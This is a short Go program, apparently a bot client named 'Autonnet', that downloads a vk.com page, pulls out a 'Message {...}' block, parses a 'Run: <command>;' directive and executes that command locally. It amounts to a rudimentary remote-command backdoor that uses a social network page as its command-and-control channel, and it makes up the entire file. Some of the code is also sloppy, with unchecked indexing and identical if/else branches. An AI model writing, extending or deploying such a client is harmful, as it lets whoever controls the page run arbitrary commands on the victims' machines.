package main

import (
	"fmt"
	"net/http"
	"io/ioutil"
	"os"
	"os/exec"
	"regexp"
	"strings"
)

var (
	InfoMessage = "\nAutonnet project(Message reciver)\n"
	Url = "https://vk.com/ffehh"
	ResultMessage string
)


func RunCommand(Value string) (string, bool) {
	fmt.Printf("Run command: %s\n", Value)
	CommandOutput, Err := exec.Command(Value).Output()
	if Err != nil {
		return Err.Error(), false
	}
	return string(CommandOutput), true
	// fmt.Printf("Run command: %s\n", Value)
	// Cmd := exec.Command(Value)
	// Err := Cmd.Start()
	// if Err != nil {
	// 	return Err.Error(), false
	// }
	// Err = Cmd.Wait()
	// return Err.Error(), true
}

func ParseMessage(Message string) string {
	var Result string
	PatternRun, _ := regexp.Compile(`([rR]un[:]{1}[\s]*)([^\;]*)([\s]*[\;]{1})`)
	Matches := PatternRun.FindAllString(Message, -1)
	
	Command := Matches[0]

	Begin := strings.Index(Command, ":")
	End := strings.Index(Command, ";")

	Cmd := Command[0 : Begin]
	Value := Command[Begin + 1: End]
	Cmd = strings.Trim(Cmd, " ")
	Value = strings.Trim(Value, " ")
	fmt.Printf("Command: %s\nValue: %s\n", Cmd, Value)

	if (Cmd == "Run") || (Cmd == "run") {
		Result, _ = RunCommand(Value)
	}
	
	fmt.Printf("Run result: %s\n", Result)

	return ""
}



func main() {
	fmt.Println(InfoMessage)

	fmt.Printf("Target is %s\n", Url)
	Response, Err := http.Get(Url)
	
	if Err != nil {
		fmt.Println(Err)
		os.Exit(1)
	}
	
	defer Response.Body.Close()

	Content, Err := ioutil.ReadAll(Response.Body)

	if Err != nil {
		fmt.Println(Err)
		os.Exit(1)
	}

	StringData := string(Content)
	
	Pattern := regexp.MustCompile("Message {[^}]*}")
	Matches := Pattern.FindAllString(StringData, -1)
	NumOfMessages := len(Matches)
	if NumOfMessages != 1 {
		ResultMessage = Matches[0]
	} else {
		ResultMessage = Matches[0]
	}
	ResultMessage := strings.Replace(ResultMessage, "<br/>", "\n", -1)
	
	fmt.Printf("\nNum of messages: %d\nLast message:\n%s\n", NumOfMessages, ResultMessage)	
	ResultMessage = ParseMessage(ResultMessage)
}
